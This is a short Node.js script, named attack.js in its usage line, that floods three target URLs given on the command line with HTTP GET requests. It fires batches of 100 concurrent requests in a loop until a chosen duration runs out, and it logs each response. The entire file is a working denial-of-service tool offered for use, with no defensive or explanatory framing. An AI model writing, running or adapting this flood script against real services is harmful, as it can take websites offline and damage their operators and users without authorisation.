const axios = require('axios');

const target1 = process.argv[2];
const target2 = process.argv[3];
const target3 = process.argv[4];
const duration = parseInt(process.argv[5]); // in ms

if (!target1 || !target2 || !target3 || isNaN(duration) || duration <= 0 || duration > 500000) {
  console.error('Usage: node attack.js <target1> <target2> <target3> <duration_in_ms>');
  process.exit(1);
}

const MAX_TIMEOUT = 25000;
const CONCURRENT_REQUESTS = 100;

let isRunning = true;
const targets = [target1, target2, target3];

async function sendRequest(url, id) {
  try {
    const res = await axios.get(url, { timeout: MAX_TIMEOUT });
    console.log(`[${url}] #${id} - ${res.status}`);
  } catch (err) {
    console.log(`[${url}] #${id} - Error: ${err.message}`);
  }
}

async function attackLoop() {
  let requestCount = 0;

  while (isRunning) {
    const batch = [];

    for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
      const url = targets[i % 3]; // Rotate between targets
      requestCount++;
      batch.push(sendRequest(url, requestCount));
    }

    await Promise.allSettled(batch);
  }
}

// Stop attack after duration
setTimeout(() => {
  console.log(`Finished attack after ${duration}ms`);
  isRunning = false;
}, duration);

// Start the attack
attackLoop();
